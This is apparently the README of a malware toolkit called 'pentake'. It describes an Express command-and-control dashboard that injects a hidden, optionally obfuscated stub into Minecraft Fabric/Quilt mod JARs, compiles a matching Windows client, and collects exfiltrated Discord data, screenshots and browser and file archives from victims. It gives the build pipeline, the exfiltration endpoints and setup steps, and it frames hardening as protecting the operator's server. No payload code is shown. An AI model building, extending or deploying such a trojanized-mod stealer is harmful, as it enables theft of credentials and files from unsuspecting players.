# pentake

Custom C2-style web application: an Express dashboard that issues personalized
Minecraft Fabric/Quilt mod JARs with a hidden update-checker stub, compiles a
matching Windows client, and receives exfiltrated data from deployed clients
into a browsable log panel.

## Repo layout

| Path       | Purpose |
|------------|---------|
| `server/`  | Express backend: auth (JWT), dashboard API, exfiltration endpoints, build orchestration, SQLite storage |
| `builder/` | JAR injector: compiles `UpdaterV2.java`, patches a Fabric/Quilt mod's entrypoint with ASM, optional obfuscation |
| `payload/` | Client template (`test.js`) compiled to `client.exe` via `@yao-pkg/pkg` |
| `of/`      | Folded-in Gradle project that builds the `fabric-obf` obfuscator (JDK 21) |
| `builds/`  | Per-user build outputs (gitignored, generated at build time) |

## Quick start (server)

```
cd server
copy .env.example .env    # then fill in real secrets
npm install
npm start
```

Required env vars: `ADMIN_PASSWORD`, `API_KEY`, `SECRET_KEY`. The server exits
at boot if any are missing rather than falling back to defaults.

Optional env: `PORT`, `JWT_SECRET` (isolate session signing from the payload
XOR key), `DB_PATH` (defaults to `server/database.sqlite`),
`ALLOWED_BUILD_IDS` (comma-separated allowlist).

`server/.env` is gitignored. Never commit `.env`.

## Build pipeline

`POST /api/build/generate` (admin):

1. Reads `payload/test.js`, replaces the `PLACEHOLDER_*` tokens with the user's
   ID, the server's host URL, and the real API/SECRET keys from the environment.
2. Compiles the payload with the **locally installed** `@yao-pkg/pkg`
   (devDependency of `payload/`) → `builds/user_{id}/dist/client.exe`. No per-
   build network fetch.
3. Runs `node builder/index.js <mod.jar> <userId> <dist> <updateUrl>` which:
   - downloads ASM `lib/asm-9.6.jar` from Maven Central on first use
     (binary artifact is gitignored),
   - compiles `ByteCodeInjector.java` when the `.class` is missing,
   - compiles a randomized `UpdaterV2` class and patches the mod's entrypoint,
   - embeds `user_id.txt`.
4. Optionally obfuscates the result with `of/build/libs/fabric-obf.jar`
   (`OBF2_JAR` env overrides the default path). If the obfuscator jar is absent
   the build keeps the injected JAR and continues — obfuscation never aborts a
   valid injection.

Prerequisites: Node 18+, a JDK for the injector (`--release 17` by default,
`INJECTOR_JAVA_RELEASE` to override), and JDK 21 if you want the obfuscator
built from `of/` (`cd of && gradle build`).

## Exfiltration storage

Inbound reports (`/discord`, `/log`, `/collect`, `/err`, `/antivm`) are stored
one-row-per-event in the `exfil_events` SQLite table — replacing the old
pattern of rewriting a single growing JSON array on every event (which was
O(n²) on large builds and could lose writes under concurrency). File payloads
(screenshots, browser/file zips) still land on disk under
`server/uploads/{buildId}/`.

Meta counters live in each build's `meta.json` (single atomic read-modify-write
per event), and `/api/logs` scans the uploads tree asynchronously behind a 1 s
TTL cache instead of blocking the event loop on every request.

## Security notes

- Legacy endpoints `/init`, `/log_data`, `/v2/data`, `/log_files` were
  vulnerable to directory traversal via attacker-controlled `X-Session-ID` /
  `X-Trace-ID` headers: values are now validated against a strict token pattern
  before use as path segments, and `/api/download` requires the resolved path
  to stay inside the uploads tree (trailing-separator prefix check).
- Legacy endpoints intentionally remain unauthenticated to keep already-
  deployed clients working; `/v2/data` payloads are XOR-obfuscated with
  `SECRET_KEY`. New-build endpoints require `X-API-KEY` + `X-BUILD-ID`.
- Session JWTs and the legacy XOR key can be isolated via `JWT_SECRET`.
- Login/register are rate-limited (20/min per IP), cookies are HttpOnly with
  `SameSite=Strict` and `Secure` when served over HTTPS, and build errors are
  reported generically (no absolute server paths leaked).

## Tests

```
cd server
npm test
```

The suite forks the server on an isolated port and a throwaway SQLite file
(`DB_PATH`), polls for readiness, and covers auth, role checks, traversal
rejection, rate limiting, and the SQLite exfil event path.